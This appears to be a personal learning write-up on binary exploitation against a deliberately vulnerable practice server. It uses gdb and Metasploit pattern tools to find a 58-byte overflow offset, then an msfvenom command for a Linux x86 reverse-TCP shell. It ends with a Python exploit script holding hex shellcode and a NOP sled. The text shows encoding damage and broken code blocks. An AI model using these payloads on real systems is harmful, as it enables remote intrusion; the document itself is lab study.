I"¤<h1 id="learning-binary-exploitation--3">Learning binary exploitation â€” 3</h1>

<p>The vulnerable code I used in this blog:</p>

<p>[</p>

<h2 id="vulnerable-serverexploit_smart_serverpy-at-master--dennis95stummvulnerable-server">Vulnerable-Server/exploit_smart_server.py at master Â· dennis95stumm/Vulnerable-Server</h2>

<h3 id="this-file-contains-bidirectional-unicode-text-that-may-be-interpreted-or-compiled-differently-than-what-appears-below">This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears belowâ€¦</h3>

<p>github.com](https://github.com/dennis95stumm/Vulnerable-Server/blob/master/exploit_smart_server.py)</p>

<h1 id="overflowing-the-buffer">Overflowing the buffer</h1>

<p>First, I used gdb to figure out which function was responsible for checking the input we provide. Looks like checkAuth is the function I was looking for.</p>

<p><img src="https://miro.medium.com/max/1400/1*F5dh6MMRacJ7zyKm6G2uBA.png" alt="" /></p>

<p>To observe the state of the registers and the stack, I created a breakpoint right after strcmp instruction in checkAuth function. Then I created a buffer of length 5000 hoping that it would be sufficient to overflow the buffer.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf-pattern\_create -l 5000
```![](https://miro.medium.com/max/1400/1*0zJTOJdqTde9Uvln8Z-3HA.png)It was sufficient!

Notice the address at the bottom, thatâ€™s the EIP. After obtaining the EIP, I tried to find the exact offset required to overflow the buffer.

</code></pre></div></div>
<p>msf-pattern_offset -l 5000 -q 0x63413962</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
*   _The offset was 58_

At this point I realized two things:

1.  Even if I send a normal input after setting a breakpoint, the contents of `secret_buffer`, which holds the key to validating our input, is revealed.
2.  If I had looked at the code of `checkAuth` function first, instead of being a skid and going straight into exploitation, I wouldâ€™ve instantly found the key (secret\_buffer) and noticed another variable `auth_flag` which determines if the program should move forward or not.

![](https://miro.medium.com/max/1400/1*IY4xTS7yPLyZsdKFLM_a3g.png)LESSON LEARNED

Anyway, whatâ€™s happening here is, when we overflow the buffer it actually overwrites the auth\_flag too which is then returned by `checkAuth`function and is eventually checked if itâ€™s true or not, so any value other than 0 will get us through.

Shellcode Injection
===================

Now I could perfectly overwrite EIP with `python -c 'print "A"*58+"BBBB"'`

![](https://miro.medium.com/max/1400/1*FTSIG8Ma_VkGKK-LcX98ZQ.png)EIP Overwritten

Now, I just had to find a unique address to inject the shellcode.

**_Note: Do_** `**unset env**` **_in gdb to remove any environment variables during the program run which may alter the memory addresses_**

Before finding a location for my shellcode, I had to generate one.

</code></pre></div></div>
<p>msfvenom -p linux/x86/shell_reverse_tcp -b â€œ\x00â€ LHOST=<listening-ip> LPORT=<listening-port> -f python -o reverse</listening-port></listening-ip></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
Also, to make sure memory address donâ€™t get messed up I used NOPs too. I struggled quite a bit to find a suitable memory address. Hereâ€™s how I did it:

1.  I just used `print pad+nopslide+test_payload`to find the address where â€œ\\x43â€ starts
2.  Then used that address in place of $eip, hoping that eip will point to the location of my shellcode (test\_payload, in the previous step)
3.  Now, I tested `print pad+eip+nopslide+test_payload` and this time I noticed â€œ\\x43â€ started from a different address, maybe the additional 4 bytes of $eip that I provided had somehow shifted the memory locations.
4.  So, I used the address I found in (3) in eip and redirected the output of exploit.py into the program and got a shell

P.S. Iâ€™m not sure if this is the right way to do this.

Hereâ€™s the exploit script that I used:

</code></pre></div></div>
<p>import structpad = â€œAâ€*58<br />
eip = struct.pack(â€œ&lt;Iâ€, 0xffffd1b2) <br />
buf =  bâ€â€<br />
buf += bâ€\xd9\xee\xba\x44\x2f\xab\x19\xd9\x74\x24\xf4\x5f\x31â€<br />
buf += bâ€\xc9\xb1\x12\x31\x57\x17\x83\xef\xfc\x03\x13\x3c\x49â€<br />
buf += bâ€\xec\xaa\x99\x7a\xec\x9f\x5e\xd6\x99\x1d\xe8\x39\xedâ€<br />
buf += bâ€\x47\x27\x39\x9d\xde\x07\x05\x6f\x60\x2e\x03\x96\x08â€<br />
buf += bâ€\x71\x5b\x50\xcd\x19\x9e\xa1\xee\xf0\x17\x40\x40\x64â€<br />
buf += bâ€\x78\xd2\xf3\xda\x7b\x5d\x12\xd1\xfc\x0f\xbc\x84\xd3â€<br />
buf += bâ€\xdc\x54\x31\x03\x0c\xc6\xa8\xd2\xb1\x54\x78\x6c\xd4â€<br />
buf += bâ€\xe8\x75\xa3\x97â€test_payload = â€œCâ€*95<br />
nopslide = â€œ\x90â€*100print pad+eip+nopslide+buf
```</p>

<p>Of course, I couldâ€™ve just used sockets to make things easier, but I was feeling a bit adventurous Â¯\_(ãƒ„)_/Â¯</p>

<p>So I sent this payloadâ€¦</p>

<p><img src="https://miro.medium.com/max/1400/1*53krhS2u8gJArpYkst3KAg.png" alt="" /></p>

<p>â€¦and I got the shell!</p>

<p>Thank you for reading.</p>
:ET